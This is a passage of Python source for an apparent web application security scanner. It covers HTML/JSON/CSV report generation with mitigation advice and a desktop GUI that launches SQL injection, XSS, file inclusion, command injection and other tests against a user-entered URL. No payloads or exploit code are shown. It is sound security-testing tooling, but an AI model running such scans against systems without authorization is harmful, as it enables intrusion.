                    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
                    overflow: hidden;
                    margin: 20px 0;
                }}
                
                .header {{
                    background: linear-gradient(135deg, #1a237e 0%, #283593 100%);
                    color: white;
                    padding: 40px;
                    text-align: center;
                }}
                
                .header h1 {{
                    font-size: 2.5em;
                    margin-bottom: 10px;
                    font-weight: 300;
                }}
                
                .header h1 i {{
                    margin-right: 15px;
                }}
                
                .header .subtitle {{
                    opacity: 0.9;
                    font-size: 1.1em;
                }}
                
                .content {{
                    padding: 40px;
                }}
                
                .section {{
                    margin-bottom: 40px;
                }}
                
                .section-title {{
                    font-size: 1.5em;
                    color: #1a237e;
                    margin-bottom: 20px;
                    padding-bottom: 10px;
                    border-bottom: 2px solid #e0e0e0;
                    display: flex;
                    align-items: center;
                }}
                
                .section-title i {{
                    margin-right: 10px;
                }}
                
                .info-grid {{
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
                    gap: 20px;
                    margin-bottom: 30px;
                }}
                
                .info-card {{
                    background: #f8f9fa;
                    border-radius: 10px;
                    padding: 20px;
                    border-left: 4px solid #1a237e;
                }}
                
                .info-card h3 {{
                    color: #1a237e;
                    margin-bottom: 10px;
                    font-size: 1.1em;
                }}
                
                .risk-score {{
                    font-size: 3em;
                    font-weight: bold;
                    text-align: center;
                    margin: 20px 0;
                }}
                
                .risk-low {{ color: #32cd32; }}
                .risk-medium {{ color: #ffbf00; }}
                .risk-high {{ color: #ff7f00; }}
                .risk-critical {{ color: #ff3860; }}
                
                .chart-container {{
                    max-width: 600px;
                    margin: 0 auto;
                }}
                
                .vuln-list {{
                    display: grid;
                    gap: 20px;
                }}
                
                .vuln-card {{
                    border-radius: 10px;
                    padding: 20px;
                    border-left: 4px solid;
                    background: #f8f9fa;
                    transition: transform 0.3s, box-shadow 0.3s;
                }}
                
                .vuln-card:hover {{
                    transform: translateY(-5px);
                    box-shadow: 0 10px 30px rgba(0,0,0,0.1);
                }}
                
                .vuln-header {{
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    margin-bottom: 15px;
                }}
                
                .vuln-title {{
                    font-size: 1.2em;
                    font-weight: bold;
                }}
                
                .severity-badge {{
                    padding: 5px 15px;
                    border-radius: 20px;
                    color: white;
                    font-weight: bold;
                    font-size: 0.9em;
                }}
                
                .vuln-details {{
                    display: grid;
                    gap: 10px;
                    margin-top: 15px;
                }}
                
                .detail-row {{
                    display: flex;
                }}
                
                .detail-label {{
                    font-weight: bold;
                    min-width: 150px;
                    color: #555;
                }}
                
                .detail-value {{
                    flex: 1;
                    word-break: break-word;
                }}
                
                .recommendation {{
                    background: #e8f5e9;
                    border-radius: 8px;
                    padding: 15px;
                    margin-top: 15px;
                    border-left: 4px solid #4caf50;
                }}
                
                .recommendation h4 {{
                    color: #2e7d32;
                    margin-bottom: 10px;
                }}
                
                .tech-stack {{
                    display: flex;
                    flex-wrap: wrap;
                    gap: 10px;
                    margin-top: 10px;
                }}
                
                .tech-tag {{
                    background: #e3f2fd;
                    color: #1565c0;
                    padding: 5px 10px;
                    border-radius: 15px;
                    font-size: 0.9em;
                }}
                
                .stats-grid {{
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                    gap: 20px;
                    text-align: center;
                }}
                
                .stat-card {{
                    padding: 20px;
                    border-radius: 10px;
                    background: #f8f9fa;
                }}
                
                .stat-number {{
                    font-size: 2.5em;
                    font-weight: bold;
                    margin-bottom: 5px;
                }}
                
                .stat-label {{
                    color: #666;
                    font-size: 0.9em;
                }}
                
                .footer {{
                    text-align: center;
                    padding: 30px;
                    background: #f8f9fa;
                    border-top: 1px solid #e0e0e0;
                    color: #666;
                }}
                
                @media print {{
                    body {{
                        background: white;
                    }}
                    .report-card {{
                        box-shadow: none;
                    }}
                    .vuln-card:hover {{
                        transform: none;
                        box-shadow: none;
                    }}
                }}
                
                pre {{
                    background: #2d2d2d;
                    color: #f8f8f2;
                    padding: 15px;
                    border-radius: 5px;
                    overflow-x: auto;
                    font-family: 'Courier New', monospace;
                    font-size: 0.9em;
                }}
                
                code {{
                    background: #f1f1f1;
                    padding: 2px 5px;
                    border-radius: 3px;
                    font-family: 'Courier New', monospace;
                }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="report-card">
                    <div class="header">
                        <h1><i>🔒</i> Security Assessment Report</h1>
                        <p class="subtitle">Generated by Web Application Security Testing Framework</p>
                    </div>
                    
                    <div class="content">
                        <!-- Executive Summary -->
                        <div class="section">
                            <h2 class="section-title"><i>📊</i> Executive Summary</h2>
                            
                            <div class="info-grid">
                                <div class="info-card">
                                    <h3><i>🎯</i> Target</h3>
                                    <p>{test_result.target_url}</p>
                                </div>
                                
                                <div class="info-card">
                                    <h3><i>📅</i> Scan Period</h3>
                                    <p>{test_result.start_time} to {test_result.end_time}</p>
                                </div>
                                
                                <div class="info-card">
                                    <h3><i>🔍</i> Scan Type</h3>
                                    <p>{test_result.scan_type}</p>
                                </div>
                                
                                <div class="info-card">
                                    <h3><i>📈</i> Status</h3>
                                    <p>{test_result.status}</p>
                                </div>
                            </div>
                            
                            <!-- Risk Score -->
                            <div class="risk-score {f'risk-{"critical" if risk_score > 8 else "high" if risk_score > 6 else "medium" if risk_score > 4 else "low"}'}">
                                {risk_score:.1f}/10
                            </div>
                            <p style="text-align: center; color: #666; margin-bottom: 30px;">
                                Overall Risk Score (Higher = More Risky)
                            </p>
                            
                            <!-- Statistics -->
                            <div class="stats-grid">
                                <div class="stat-card">
                                    <div class="stat-number" style="color: {severity_colors['Critical']}">
                                        {severity_counts['Critical']}
                                    </div>
                                    <div class="stat-label">Critical</div>
                                </div>
                                
                                <div class="stat-card">
                                    <div class="stat-number" style="color: {severity_colors['High']}">
                                        {severity_counts['High']}
                                    </div>
                                    <div class="stat-label">High</div>
                                </div>
                                
                                <div class="stat-card">
                                    <div class="stat-number" style="color: {severity_colors['Medium']}">
                                        {severity_counts['Medium']}
                                    </div>
                                    <div class="stat-label">Medium</div>
                                </div>
                                
                                <div class="stat-card">
                                    <div class="stat-number" style="color: {severity_colors['Low']}">
                                        {severity_counts['Low']}
                                    </div>
                                    <div class="stat-label">Low</div>
                                </div>
                                
                                <div class="stat-card">
                                    <div class="stat-number" style="color: {severity_colors['Info']}">
                                        {severity_counts['Info']}
                                    </div>
                                    <div class="stat-label">Info</div>
                                </div>
                            </div>
                            
                            <!-- Chart -->
                            <div class="chart-container">
                                <canvas id="severityChart"></canvas>
                            </div>
                        </div>
                        
                        <!-- Technology Stack -->
        """
        
        if test_result.tech_stack:
            html_content += f"""
                        <div class="section">
                            <h2 class="section-title"><i>🔧</i> Technology Stack</h2>
                            <div class="tech-stack">
            """
            
            for tech_type, techs in test_result.tech_stack.items():
                if isinstance(techs, list):
                    for tech in techs:
                        html_content += f'<span class="tech-tag">{tech}</span>'
                elif isinstance(techs, dict):
                    for key, value in techs.items():
                        html_content += f'<span class="tech-tag">{key}: {value}</span>'
                else:
                    html_content += f'<span class="tech-tag">{techs}</span>'
                    
            html_content += """
                            </div>
                        </div>
            """
        
        html_content += """
                        <!-- Detailed Findings -->
                        <div class="section">
                            <h2 class="section-title"><i>🔍</i> Detailed Findings</h2>
                            <div class="vuln-list">
        """
        
        for severity in ["Critical", "High", "Medium", "Low", "Info"]:
            vulns = vulns_by_severity[severity]
            if vulns:
                html_content += f"""
                                <h3 style="color: {severity_colors[severity]}; margin: 20px 0 10px 0;">
                                    {severity} Severity ({len(vulns)})
                                </h3>
                """
                
                for vuln in vulns:
                    html_content += f"""
                                <div class="vuln-card" style="border-color: {severity_colors[severity]};">
                                    <div class="vuln-header">
                                        <div class="vuln-title">{vuln.name}</div>
                                        <div class="severity-badge" style="background: {severity_colors[severity]}">
                                            {vuln.severity}
                                        </div>
                                    </div>
                                    
                                    <p>{vuln.description}</p>
                                    
                                    <div class="vuln-details">
                                        <div class="detail-row">
                                            <div class="detail-label">ID:</div>
                                            <div class="detail-value">{vuln.id}</div>
                                        </div>
                                        
                                        <div class="detail-row">
                                            <div class="detail-label">URL:</div>
                                            <div class="detail-value">{vuln.url}</div>
                                        </div>
                                        
                                        <div class="detail-row">
                                            <div class="detail-label">Parameter:</div>
                                            <div class="detail-value">{vuln.parameter}</div>
                                        </div>
                                        
                                        <div class="detail-row">
                                            <div class="detail-label">Payload:</div>
                                            <div class="detail-value"><code>{html.escape(vuln.payload)}</code></div>
                                        </div>
                                        
                                        <div class="detail-row">
                                            <div class="detail-label">Evidence:</div>
                                            <div class="detail-value">{vuln.evidence}</div>
                                        </div>
                                        
                                        <div class="detail-row">
                                            <div class="detail-label">CVSS Score:</div>
                                            <div class="detail-value">{vuln.cvss_score}/10.0</div>
                                        </div>
                                        
                                        <div class="detail-row">
                                            <div class="detail-label">OWASP Category:</div>
                                            <div class="detail-value">{vuln.owasp_category}</div>
                                        </div>
                                        
                                        <div class="detail-row">
                                            <div class="detail-label">CWE ID:</div>
                                            <div class="detail-value">{vuln.cwe_id}</div>
                                        </div>
                                    </div>
                                    
                                    <div class="recommendation">
                                        <h4>🛡️ Recommendation</h4>
                                        <p>{vuln.recommendation}</p>
                                    </div>
                                </div>
                    """
        
        html_content += """
                            </div>
                        </div>
                        
                        <!-- Mitigation Strategies -->
                        <div class="section">
                            <h2 class="section-title"><i>🛡️</i> Mitigation Strategies</h2>
                            
                            <div class="info-grid">
                                <div class="info-card">
                                    <h3>SQL Injection</h3>
                                    <ul>
                                        <li>Use parameterized queries or prepared statements</li>
                                        <li>Implement proper input validation</li>
                                        <li>Use stored procedures</li>
                                        <li>Apply principle of least privilege for database accounts</li>
                                        <li>Implement Web Application Firewall (WAF)</li>
                                    </ul>
                                </div>
                                
                                <div class="info-card">
                                    <h3>Cross-Site Scripting (XSS)</h3>
                                    <ul>
                                        <li>Implement proper output encoding</li>
                                        <li>Use Content Security Policy (CSP) headers</li>
                                        <li>Validate and sanitize all user inputs</li>
                                        <li>Use frameworks with automatic escaping</li>
                                        <li>Implement X-XSS-Protection header</li>
                                    </ul>
                                </div>
                                
                                <div class="info-card">
                                    <h3>Authentication Flaws</h3>
                                    <ul>
                                        <li>Implement multi-factor authentication</li>
                                        <li>Enforce strong password policies</li>
                                        <li>Use secure session management with proper timeout</li>
                                        <li>Implement account lockout mechanisms</li>
                                        <li>Use secure password hashing (bcrypt, Argon2)</li>
                                    </ul>
                                </div>
                                
                                <div class="info-card">
                                    <h3>CSRF Protection</h3>
                                    <ul>
                                        <li>Implement anti-CSRF tokens</li>
                                        <li>Use SameSite cookie attribute</li>
                                        <li>Check Origin and Referer headers</li>
                                        <li>Implement double submit cookie pattern</li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                        
                        <!-- Appendix -->
                        <div class="section">
                            <h2 class="section-title"><i>📋</i> Appendix</h2>
                            
                            <div class="info-card">
                                <h3>About This Report</h3>
                                <p>This report was generated by the Web Application Security Testing Framework (WASTF).</p>
                                <p><strong>Disclaimer:</strong> This report is for authorized security testing only. Unauthorized testing is illegal.</p>
                                <p><strong>Confidentiality:</strong> This document contains sensitive security information. Handle with care.</p>
                            </div>
                            
                            <div class="info-card">
                                <h3>Severity Definitions</h3>
                                <ul>
                                    <li><strong>Critical:</strong> Immediate remediation required. Allows complete system compromise.</li>
                                    <li><strong>High:</strong> High priority remediation. Significant impact on security.</li>
                                    <li><strong>Medium:</strong> Remediate in reasonable timeframe. Moderate security impact.</li>
                                    <li><strong>Low:</strong> Low priority. Minimal security impact.</li>
                                    <li><strong>Info:</strong> Informational findings. No direct security impact.</li>
                                </ul>
                            </div>
                        </div>
                    </div>
                    
                    <div class="footer">
                        <p>Generated on {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
                        <p>© 2025 Web Application Security Testing Framework | Version 1.0</p>
                    </div>
                </div>
            </div>
            
            <script>
                // Create severity chart
                const ctx = document.getElementById('severityChart').getContext('2d');
                const severityChart = new Chart(ctx, {{
                    type: 'doughnut',
                    data: {{
                        labels: ['Critical', 'High', 'Medium', 'Low', 'Info'],
                        datasets: [{{
                            data: [
                                {severity_counts['Critical']},
                                {severity_counts['High']},
                                {severity_counts['Medium']},
                                {severity_counts['Low']},
                                {severity_counts['Info']}
                            ],
                            backgroundColor: [
                                '{severity_colors['Critical']}',
                                '{severity_colors['High']}',
                                '{severity_colors['Medium']}',
                                '{severity_colors['Low']}',
                                '{severity_colors['Info']}'
                            ],
                            borderWidth: 2,
                            borderColor: 'white'
                        }}]
                    }},
                    options: {{
                        responsive: true,
                        plugins: {{
                            legend: {{
                                position: 'bottom',
                                labels: {{
                                    padding: 20,
                                    usePointStyle: true
                                }}
                            }},
                            tooltip: {{
                                callbacks: {{
                                    label: function(context) {{
                                        return context.label + ': ' + context.raw + ' vulnerabilities';
                                    }}
                                }}
                            }}
                        }},
                        cutout: '60%'
                    }}
                }});
                
                // Print functionality
                document.addEventListener('keydown', function(e) {{
                    if ((e.ctrlKey || e.metaKey) && e.key === 'p') {{
                        e.preventDefault();
                        window.print();
                    }}
                }});
            </script>
        </body>
        </html>
        """
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html_content)
            
        logger.info(f"HTML report saved to: {filename}")
        return filename
    
    @staticmethod
    def generate_json_report(test_result: TestResult, filename=None):
        """Generate JSON report"""
        if not filename:
            filename = f"security_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            
        result_dict = {
            "metadata": {
                "tool": "WASTF",
                "version": "2.0",
                "generated_at": datetime.now().isoformat(),
                "report_type": "security_assessment"
            },
            "scan_info": {
                "target_url": test_result.target_url,
                "start_time": test_result.start_time,
                "end_time": test_result.end_time,
                "scan_type": test_result.scan_type,
                "status": test_result.status,
                "duration": str(datetime.fromisoformat(test_result.end_time) - datetime.fromisoformat(test_result.start_time))
            },
            "technology_stack": test_result.tech_stack,
            "vulnerabilities": [asdict(v) for v in test_result.vulnerabilities],
            "statistics": {
                "total_vulnerabilities": len(test_result.vulnerabilities),
                "by_severity": {
                    "Critical": len([v for v in test_result.vulnerabilities if v.severity == "Critical"]),
                    "High": len([v for v in test_result.vulnerabilities if v.severity == "High"]),
                    "Medium": len([v for v in test_result.vulnerabilities if v.severity == "Medium"]),
                    "Low": len([v for v in test_result.vulnerabilities if v.severity == "Low"]),
                    "Info": len([v for v in test_result.vulnerabilities if v.severity == "Info"])
                },
                "by_category": {
                    "Injection": len([v for v in test_result.vulnerabilities if "A03" in v.owasp_category]),
                    "Broken_Authentication": len([v for v in test_result.vulnerabilities if "A07" in v.owasp_category]),
                    "Security_Misconfiguration": len([v for v in test_result.vulnerabilities if "A05" in v.owasp_category]),
                    "Broken_Access_Control": len([v for v in test_result.vulnerabilities if "A01" in v.owasp_category])
                }
            },
            "risk_assessment": {
                "risk_score": sum(
                    len([v for v in test_result.vulnerabilities if v.severity == sev]) * weight
                    for sev, weight in {"Critical": 10, "High": 7.5, "Medium": 5, "Low": 2.5, "Info": 1}.items()
                ) / max(len(test_result.vulnerabilities), 1),
                "risk_level": ""
            }
        }
        
        # Calculate risk level
        risk_score = result_dict["risk_assessment"]["risk_score"]
        if risk_score >= 8:
            risk_level = "Critical"
        elif risk_score >= 6:
            risk_level = "High"
        elif risk_score >= 4:
            risk_level = "Medium"
        elif risk_score >= 2:
            risk_level = "Low"
        else:
            risk_level = "Informational"
            
        result_dict["risk_assessment"]["risk_level"] = risk_level
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(result_dict, f, indent=2, default=str)
            
        logger.info(f"JSON report saved to: {filename}")
        return filename
    
    @staticmethod
    def generate_csv_report(test_result: TestResult, filename=None):
        """Generate CSV report"""
        if not filename:
            filename = f"security_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
            
        with open(filename, 'w', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow([
                'ID', 'Name', 'Severity', 'Description', 'URL', 'Parameter',
                'Payload', 'Evidence', 'Recommendation', 'CVSS Score',
                'CVSS Vector', 'OWASP Category', 'CWE ID', 'Timestamp'
            ])
            
            for vuln in test_result.vulnerabilities:
                writer.writerow([
                    vuln.id, vuln.name, vuln.severity, vuln.description,
                    vuln.url, vuln.parameter, vuln.payload, vuln.evidence,
                    vuln.recommendation, vuln.cvss_score, vuln.cvss_vector,
                    vuln.owasp_category, vuln.cwe_id, vuln.timestamp
                ])
                
        logger.info(f"CSV report saved to: {filename}")
        return filename

# ============================================
# PySimpleGUI Application
# ============================================

class SecurityScannerGUI:
    """Main GUI application using PySimpleGUI"""
    
    def __init__(self):
        self.tester = None
        self.scan_thread = None
        self.scan_results = None
        self.tech_info = None
        self.window = None
        self.create_window()
        
    def create_window(self):
        """Create the main application window"""
        
        # Theme
        sg.theme('DarkGrey13')
        
        # Layout for the main window
        layout = [
            # Header
            [sg.Text('🔒 Web Application Security Testing Framework', 
                    font=('Helvetica', 24, 'bold'), 
                    text_color='#4CAF50', 
                    justification='center', 
                    expand_x=True)],
            [sg.Text('Comprehensive Security Testing Tool', 
                    font=('Helvetica', 12), 
                    text_color='#888', 
                    justification='center', 
                    expand_x=True)],
            [sg.HorizontalSeparator(color='#333')],
            
            # Target Input
            [sg.Text('Target URL:', font=('Helvetica', 11, 'bold'))],
            [sg.InputText(default_text='http://testphp.vulnweb.com', 
                         key='-URL-', 
                         size=(60, 1),
                         tooltip='Enter the target website URL'),
             sg.Button('Load', key='-LOAD-', size=(8, 1))],
            
            # Test Selection
            [sg.Text('Test Types:', font=('Helvetica', 11, 'bold'))],
            [
                sg.Column([
                    [sg.Checkbox('SQL Injection', default=True, key='-SQL-')],
                    [sg.Checkbox('XSS (Cross-Site Scripting)', default=True, key='-XSS-')],
                    [sg.Checkbox('File Inclusion', default=True, key='-LFI-')],
                    [sg.Checkbox('Command Injection', default=True, key='-CMD-')]
                ]),
                sg.Column([
                    [sg.Checkbox('Authentication Flaws', default=True, key='-AUTH-')],
                    [sg.Checkbox('CSRF', default=True, key='-CSRF-')],
                    [sg.Checkbox('IDOR', default=True, key='-IDOR-')],
                    [sg.Checkbox('Security Headers', default=True, key='-HEADERS-')]
                ]),
                sg.Column([
                    [sg.Checkbox('Directory Listing', default=True, key='-DIR-')],
                    [sg.Checkbox('HTTP Methods', default=True, key='-HTTP-')],
                    [sg.Checkbox('All Tests', key='-ALL-', enable_events=True)],
                    [sg.Checkbox('Quick Scan', key='-QUICK-', tooltip='Run limited tests for speed')]
                ])
            ],
            
            # Scan Options
            [sg.Text('Advanced Options:', font=('Helvetica', 11, 'bold'))],
            [
                sg.Column([
                    [sg.Text('Max Depth:'), 
                     sg.Slider(range=(1, 5), default_value=2, orientation='h', key='-DEPTH-', size=(20, 15))],
                    [sg.Text('Timeout (sec):'), 
                     sg.Slider(range=(1, 30), default_value=10, orientation='h', key='-TIMEOUT-', size=(20, 15))]
                ]),
                sg.Column([
                    [sg.Checkbox('Save Requests/Responses', key='-SAVE_REQ-')],
                    [sg.Checkbox('Verbose Logging', key='-VERBOSE-')],
                    [sg.Checkbox('Follow Redirects', default=True, key='-REDIRECT-')]
                ])
            ],
            
            # Control Buttons
            [
                sg.Button('▶ Start Scan', key='-SCAN-', size=(15, 2), button_color=('white', '#4CAF50')),
                sg.Button('⏹ Stop', key='-STOP-', size=(15, 2), button_color=('white', '#f44336'), disabled=True),
                sg.Button('📊 Generate Report', key='-REPORT-', size=(15, 2), button_color=('white', '#2196F3'), disabled=True),
                sg.Button('🔄 Clear Results', key='-CLEAR-', size=(15, 2), button_color=('white', '#FF9800'))
            ],
            
            # Progress Bar
            [sg.ProgressBar(100, orientation='h', size=(60, 20), key='-PROGRESS-', bar_color=('#4CAF50', '#ccc'))],
            [sg.Text('Ready', key='-STATUS-', size=(60, 1), justification='center')],
            
            # Results Tabs
            [sg.TabGroup([
                [
                    sg.Tab('Console', [
                        [sg.Multiline(size=(100, 20), key='-CONSOLE-', autoscroll=True, 
                                     background_color='#1e1e1e', text_color='#ffffff', 
                                     font=('Consolas', 10))]
                    ]),
                    sg.Tab('Vulnerabilities', [
                        [sg.Table(values=[], 
                                 headings=['ID', 'Severity', 'Name', 'URL', 'Parameter'],
                                 key='-VULN_TABLE-',
                                 auto_size_columns=False,
                                 col_widths=[8, 10, 25, 40, 15],
                                 justification='left',
                                 num_rows=15,
                                 alternating_row_color='#2d2d2d',
                                 enable_events=True,
                                 enable_click_events=True)]
                    ]),
                    sg.Tab('Details', [
                        [sg.Multiline(size=(100, 25), key='-DETAILS-', 
                                     autoscroll=True, background_color='#1e1e1e', 
                                     text_color='#ffffff', font=('Consolas', 10))]
                    ]),
                    sg.Tab('Technology', [
                        [sg.Multiline(size=(100, 25), key='-TECH-', 
                                     autoscroll=True, background_color='#1e1e1e', 
                                     text_color='#ffffff', font=('Consolas', 10))]
                    ]),
                    sg.Tab('Statistics', [
                        [sg.Column([
                            [sg.Text('Total Vulnerabilities:', font=('Helvetica', 11, 'bold'))],
                            [sg.Text('0', key='-TOTAL_VULN-', font=('Helvetica', 36, 'bold'), text_color='#4CAF50')],
                            [sg.HorizontalSeparator()],
                            [sg.Text('By Severity:', font=('Helvetica', 11, 'bold'))],
                            [sg.Text('Critical: 0', key='-CRITICAL-', text_color='#ff3860')],
                            [sg.Text('High: 0', key='-HIGH-', text_color='#ff7f00')],
                            [sg.Text('Medium: 0', key='-MEDIUM-', text_color='#ffbf00')],
                            [sg.Text('Low: 0', key='-LOW-', text_color='#32cd32')],
                            [sg.Text('Info: 0', key='-INFO-', text_color='#6495ed')]
                        ], element_justification='center')]
                    ])
                ]
            ], tab_location='topleft', expand_x=True, expand_y=True)],
            
            # Status Bar
            [sg.StatusBar('Ready | © 2025 WASTF v1.0', key='-STATUSBAR-', expand_x=True)]
        ]
        
        # Create the window
        self.window = sg.Window('Web Application Security Testing Framework', 
                               layout, 
                               resizable=True, 
                               finalize=True,
                               size=(1200, 900))
        
        # Configure console to be read-only
        self.window['-CONSOLE-'].update(disabled=True)
        self.window['-DETAILS-'].update(disabled=True)
        self.window['-TECH-'].update(disabled=True)
        
    def log_message(self, message, color=None):
        """Add message to console with timestamp"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        console = self.window['-CONSOLE-']
        
        # Get current text and append new message
        current_text = console.get()
        if color:
            # PySimpleGUI doesn't support colored text in Multiline easily
            # We'll use a simple approach
            colored_message = f"[{timestamp}] {message}\n"
        else:
            colored_message = f"[{timestamp}] {message}\n"
            
        console.update(current_text + colored_message)
        
    def update_progress(self, progress, status):
        """Update progress bar and status"""
        self.window['-PROGRESS-'].update(progress)
        self.window['-STATUS-'].update(status)
        self.window.refresh()
        
    def start_scan(self):
        """Start the security scan"""
        url = self.window['-URL-'].get().strip()
        if not url:
            sg.popup_error("Please enter a target URL", title="Error")
            return
            
        # Get selected test types
        scan_types = []
        test_map = {
            '-SQL-': 'sql',
            '-XSS-': 'xss',
            '-LFI-': 'lfi',
            '-CMD-': 'cmd',
            '-AUTH-': 'auth',
            '-CSRF-': 'csrf',
            '-IDOR-': 'idor',
            '-HEADERS-': 'headers',
            '-DIR-': 'dir',
            '-HTTP-': 'http'
        }
        
        for gui_key, test_type in test_map.items():
            if self.window[gui_key].get():
                scan_types.append(test_type)
                
        if not scan_types:
            sg.popup_error("Please select at least one test type", title="Error")
            return
            
        # Update UI state
        self.window['-SCAN-'].update(disabled=True)
        self.window['-STOP-'].update(disabled=False)
        self.window['-REPORT-'].update(disabled=True)
        self.window['-CLEAR-'].update(disabled=True)
        
        # Clear previous results
        self.window['-CONSOLE-'].update('')
        self.window['-VULN_TABLE-'].update(values=[])
        self.window['-DETAILS-'].update('')
        self.window['-TECH-'].update('')
        
        # Create tester and start scan in thread
        self.tester = AdvancedSecurityTester(url)
        
        # Start scan in separate thread
        self.scan_thread = threading.Thread(
            target=self.run_scan_thread,
            args=(url, scan_types),
            daemon=True
        )
        self.scan_thread.start()
        
        # Start progress monitoring
        threading.Thread(
            target=self.monitor_progress,
            daemon=True
        ).start()
        
    def run_scan_thread(self, url, scan_types):
        """Run scan in background thread"""
        try:
            self.log_message(f"Starting scan of {url}")
            self.log_message(f"Tests to run: {', '.join(scan_types)}")
            
            vulnerabilities, tech_info = self.tester.run_comprehensive_scan(scan_types)
            self.scan_results = vulnerabilities
            self.tech_info = tech_info
            
            # Update UI with results
            self.window.write_event_value('-SCAN_COMPLETE-', (vulnerabilities, tech_info))
            
        except Exception as e:
            self.window.write_event_value('-SCAN_ERROR-', str(e))
            
    def monitor_progress(self):
        """Monitor scan progress"""
        while self.tester and not self.tester.stop_requested:
            # Update progress from tester
            self.window['-PROGRESS-'].update(self.tester.scan_progress)
            self.window['-STATUS-'].update(self.tester.scan_status)
            
            # Update vulnerability count
            if self.tester.vulnerabilities:
                self.update_statistics()
                
            time.sleep(0.5)
            
    def update_statistics(self):
        """Update statistics display"""
        if not self.tester:
            return
            
        vulns = self.tester.vulnerabilities
        severity_counts = {
            "Critical": len([v for v in vulns if v.severity == "Critical"]),
            "High": len([v for v in vulns if v.severity == "High"]),
            "Medium": len([v for v in vulns if v.severity == "Medium"]),
            "Low": len([v for v in vulns if v.severity == "Low"]),
            "Info": len([v for v in vulns if v.severity == "Info"])
        }
        
        # Update table
        table_data = []
        for vuln in vulns:
            table_data.append([
                vuln.id,
                vuln.severity,
                vuln.name[:40] + "..." if len(vuln.name) > 40 else vuln.name,
                vuln.url[:50] + "..." if len(vuln.url) > 50 else vuln.url,
                vuln.parameter
            ])
            
        self.window['-VULN_TABLE-'].update(values=table_data)
        
        # Update statistics
        self.window['-TOTAL_VULN-'].update(str(len(vulns)))
        self.window['-CRITICAL-'].update(f"Critical: {severity_counts['Critical']}")
        self.window['-HIGH-'].update(f"High: {severity_counts['High']}")
        self.window['-MEDIUM-'].update(f"Medium: {severity_counts['Medium']}")
        self.window['-LOW-'].update(f"Low: {severity_counts['Low']}")
        self.window['-INFO-'].update(f"Info: {severity_counts['Info']}")
        
    def stop_scan(self):
        """Stop the current scan"""
        if self.tester:
            self.tester.stop_scan()
            self.log_message("Scan stop requested")
            
    def generate_report(self):
        """Generate security report"""
        if not self.scan_results:
            sg.popup_error("No scan results available", title="Error")
            return
            
        # Create test result object
        test_result = TestResult(
            target_url=self.tester.target_url,
            start_time=datetime.now().isoformat(),
            end_time=datetime.now().isoformat(),
            vulnerabilities=self.scan_results,
            scan_type="Comprehensive Security Scan",
            status="Completed",
            tech_stack=self.tech_info,
            stats={
                "total": len(self.scan_results),
                "critical": len([v for v in self.scan_results if v.severity == "Critical"]),
                "high": len([v for v in self.scan_results if v.severity == "High"]),
                "medium": len([v for v in self.scan_results if v.severity == "Medium"]),
                "low": len([v for v in self.scan_results if v.severity == "Low"]),
                "info": len([v for v in self.scan_results if v.severity == "Info"])
            }
        )
        
        # Ask for report format and location
        layout = [
            [sg.Text('Select Report Format:')],
            [sg.Radio('HTML Report', 'REPORT_FORMAT', default=True, key='-HTML-')],
            [sg.Radio('JSON Report', 'REPORT_FORMAT', key='-JSON-')],
            [sg.Radio('CSV Report', 'REPORT_FORMAT', key='-CSV-')],
            [sg.Text('Save Location:')],
            [sg.Input(key='-FILE-', enable_events=True), sg.FileSaveAs('Browse', file_types=(('HTML Files', '*.html'), ('JSON Files', '*.json'), ('CSV Files', '*.csv'), ('All Files', '*.*')))],
            [sg.Button('Generate', key='-GENERATE-'), sg.Button('Cancel', key='-CANCEL-')]
        ]
        
        report_window = sg.Window('Generate Report', layout, modal=True)
        
        while True:
            event, values = report_window.read()
            
            if event in (sg.WIN_CLOSED, '-CANCEL-'):
                break
            elif event == '-GENERATE-':
                file_path = values['-FILE-']
                if not file_path:
                    sg.popup_error("Please select a file location", title="Error")
                    continue
                    
                try:
                    if values['-HTML-']:
                        filename = EnhancedReportGenerator.generate_html_report(test_result, file_path)
                        message = f"HTML report saved to:\n{filename}"
                    elif values['-JSON-']:
                        filename = EnhancedReportGenerator.generate_json_report(test_result, file_path)
                        message = f"JSON report saved to:\n{filename}"
                    else:  # CSV
                        filename = EnhancedReportGenerator.generate_csv_report(test_result, file_path)
                        message = f"CSV report saved to:\n{filename}"
                        
                    sg.popup("Report Generated", message)
                    self.log_message(f"Report saved to: {filename}")
                    break
                    
                except Exception as e:
                    sg.popup_error(f"Error generating report: {e}", title="Error")
                    
        report_window.close()
        
    def show_vulnerability_details(self, vuln_index):
        """Show details for selected vulnerability"""
        if not self.scan_results or vuln_index >= len(self.scan_results):
            return
            
        vuln = self.scan_results[vuln_index]
        
        details = f"""
{'='*80}
VULNERABILITY DETAILS
{'='*80}

ID: {vuln.id}
Name: {vuln.name}
Severity: {vuln.severity}
CVSS Score: {vuln.cvss_score}/10.0
OWASP Category: {vuln.owasp_category}
CWE ID: {vuln.cwe_id}

Description:
{vuln.description}

URL:
{vuln.url}

Parameter: {vuln.parameter}

Payload:
{vuln.payload}

Evidence:
{vuln.evidence}

Recommendation:
{vuln.recommendation}

Timestamp: {vuln.timestamp}
{'='*80}
        """
        
        self.window['-DETAILS-'].update(details)
        
    def show_technology_info(self):
        """Show technology information"""
        if not self.tech_info:
            return
            
        tech_text = "TECHNOLOGY DETECTION RESULTS\n"
        tech_text += "=" * 50 + "\n\n"
        
        for category, info in self.tech_info.items():
            tech_text += f"{category.upper()}:\n"
            if isinstance(info, dict):
                for key, value in info.items():
                    tech_text += f"  {key}: {value}\n"
            elif isinstance(info, list):
                for item in info:
                    tech_text += f"  - {item}\n"
            else:
                tech_text += f"  {info}\n"
            tech_text += "\n"
            
        self.window['-TECH-'].update(tech_text)
        
    def run(self):
        """Main event loop"""
        while True:
            event, values = self.window.read(timeout=100)
            
            if event == sg.WIN_CLOSED:
                break
                
            elif event == '-SCAN-':
                self.start_scan()
                
